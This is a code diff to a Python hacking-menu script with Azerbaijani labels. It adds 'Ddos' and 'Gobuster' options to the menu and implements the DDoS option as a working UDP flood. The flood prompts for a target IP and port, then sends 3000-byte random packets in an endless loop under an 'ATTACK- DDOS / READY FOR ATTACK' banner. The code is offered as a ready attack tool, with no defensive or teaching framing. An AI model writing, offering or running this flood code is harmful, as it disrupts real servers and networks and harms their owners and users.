@@ -102,6 +102,8 @@ print("""\033[33mChange:(rəqəm)
 1 ---> Site adress\Ip port-scan\scan
 2 ---> Telefon Nomresi Scan
 3 ---> Ip More Info
+4 ---> Ddos
+5 ---> Gobuster
 """)
 tool = input("--->")
 if(tool == "1"):
@@ -180,7 +182,27 @@ if(tool == "3"):
   print_colored(table, Colors.BLUE)
 
  
+if(tool == "4"):
+ print_colored("""\033[31m
+ ###########################
+ #  T00L - By RED_BITH     #
+ #  ATTACK- DDOS           #
+ #  READY FOR ATTACK       #
+ ###########################
+ """)
+ dos = input("Seçim::: ")
+ if(dos == "1"):
+  hedef_ip = input("TARGET IP --->")
+  hedef_port = int(input("port --->"))
 
+  bytes = random._urandom(3000)
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  sayac = 0
+  while True:
+   sock.sendto(bytes, (hedef_ip, hedef_port))
+   sayac += 1
+   print("\033[92mHUCUM EDILIR , gonderilen byte:::%s\033[0m" % (sayac))
+   
 
 
                                     
